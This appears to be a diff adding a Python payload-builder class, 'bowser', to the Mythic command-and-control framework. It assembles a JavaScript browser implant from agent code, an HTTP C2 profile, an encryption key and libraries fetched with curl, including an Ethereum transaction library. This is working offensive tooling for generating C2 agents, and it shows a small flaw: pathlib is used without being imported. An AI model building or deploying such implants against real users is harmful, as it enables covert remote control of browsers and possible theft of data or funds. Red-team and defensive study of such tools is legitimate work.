@@ -1,0 +1,116 @@
+from email.mime import base
+from mythic_container.PayloadBuilder import *
+from mythic_container.MythicCommandBase import *
+from mythic_container.MythicRPC import *
+import sys
+import os
+import json
+
+class Bowser(PayloadType):
+
+    name = "bowser"
+    file_extension = "js"
+    author = "@thiagomayllart"
+    supported_os = [SupportedOS.MacOS]
+    wrapper = False
+    wrapped_payloads = []
+    note = """This payload uses JavaScript for browser execution."""
+    supports_dynamic_loading = False
+    c2_profiles = ["http"]
+    agent_path = pathlib.Path(".") / "bowser" / "mythic"
+    agent_code_path = pathlib.Path(".") / "bowser" / "agent_code"
+    agent_icon_path = agent_path / "agent_icon" / "bowser.svg"
+
+    mythic_encrypts = True
+    support_browser_scripts = [
+        BrowserScript(script_name="create_table", author="@thiagomayllart")
+    ]
+    translation_container = None #"translator"
+    build_parameters = []
+
+    async def build(self) -> BuildResponse:
+        # this function gets called to create an instance of your payload
+        resp = BuildResponse(status=BuildStatus.Success)
+        # create the payload
+        build_msg = ""
+        try:
+            command_code = ""
+            for cmd in self.commands.get_commands():
+                try:
+                    command_code += (
+                        open(self.agent_code_path / "{}.js".format(cmd), "r").read() + "\n"
+                    )
+                except Exception as p:
+                    pass
+            base_code = open(
+                self.agent_code_path / "base" / "bowser.js", "r"
+            ).read()
+            base_code = base_code.replace("UUID_HERE", self.uuid)
+            base_code = base_code.replace("COMMANDS_HERE", command_code)
+            all_c2_code = ""
+            if len(self.c2info) != 1:
+                resp.build_stderr = "Bowser only supports one C2 Profile at a time"
+                resp.set_status(BuildStatus.Error)
+                return resp
+            for c2 in self.c2info:
+                c2_code = ""
+                try:
+                    profile = c2.get_c2profile()
+                    c2_code = open(
+                        self.agent_code_path
+                        / "c2_profiles"
+                        / "{}.js".format(profile["name"]),
+                        "r",
+                    ).read()
+                    for key, val in c2.get_parameters_dict().items():
+                        if key == "AESPSK":
+                            c2_code = c2_code.replace(key, val["enc_key"] if val["enc_key"] is not None else "")
+                        if key == "raw_c2_config":
+                            configData = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+                                AgentFileId=val
+                            ))
+                            if not configData.Success:
+                                resp.build_stderr = configData.Error
+                                resp.set_status(BuildStatus.Error)
+                                return resp
+                            c2_code = c2_code.replace(key, configData.Content.decode())
+                        elif not isinstance(val, str):
+                            c2_code = c2_code.replace(key, json.dumps(val))
+                        else:
+                            c2_code = c2_code.replace(key, val)
+                except Exception as p:
+                    build_msg += str(p)
+                    pass
+                all_c2_code += c2_code
+            base_code = base_code.replace("C2PROFILE_HERE", all_c2_code)
+            forge_js = os.popen("curl https://cdnjs.cloudflare.com/ajax/libs/forge/1.3.1/forge.min.js").read()
+            base_code = base_code.replace("FORGE_JS_HERE",forge_js)
+            crypto_js = os.popen("curl https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js").read()
+            base_code = base_code.replace("CRYPTO_JS_HERE",crypto_js)
+            ethereum_js = os.popen("curl https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js").read()
+            base_code = base_code.replace("ETHEREUM_JS_HERE",ethereum_js)
+            sha256_js = os.popen("curl https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.min.js").read()
+            base_code = base_code.replace("SHA_256_JS_HERE",sha256_js)
+            aes256_js = os.popen("curl https://cdn.jsdelivr.net/gh/ricmoo/aes-js@e27b99df/index.js").read()
+            base_code = base_code.replace("AES_JS_HERE",aes256_js)
+            resp.payload = base_code.encode()
+            base_code = base_code.replace("CHANGE_PROFILE_DEF","")
+            base_code = base_code.replace("PROFILEVAR","default")
+            resp.payload = base_code.encode()
+            lines = base_code.split("\n")
+            non_empty_lines = [line for line in lines if line.strip() != ""]
+            final = []
+            for i in non_empty_lines:
+                if not i.strip().startswith("//"):
+                    final.append(i)
+            base_code = "\n".join(final)
+            resp.payload = base_code.encode()
+            if build_msg != "":
+                resp.build_stderr = build_msg
+                resp.set_status(BuildStatus.Error)
+            else:
+                resp.build_message = "Successfully built!\n"
+        except Exception as e:
+            resp.set_status(BuildStatus.Error)
+            resp.build_stderr = "Error building payload: " + str(e)
+        return resp
